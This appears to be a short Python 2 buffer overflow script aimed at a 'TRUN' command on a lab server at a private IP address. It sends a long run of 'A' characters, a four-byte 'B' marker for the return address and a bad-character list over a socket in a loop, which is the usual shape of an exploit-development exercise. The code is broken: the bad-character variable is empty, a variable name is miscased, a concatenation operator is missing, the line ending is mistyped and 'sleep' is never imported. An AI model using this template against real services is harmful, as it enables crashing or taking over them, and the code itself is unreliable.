#!/usr/bin/python
import sys, socket

badchars =

shellcode = "A" * 1427 + "B" * 4 + badchars

while True:
        try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('192.168.0.149',80))

                s.send(('TRun' + Shellcode 'r\n'))
                s.close()
                sleep(1)

        except:
                print "error connecting to server"
                sys.exit()
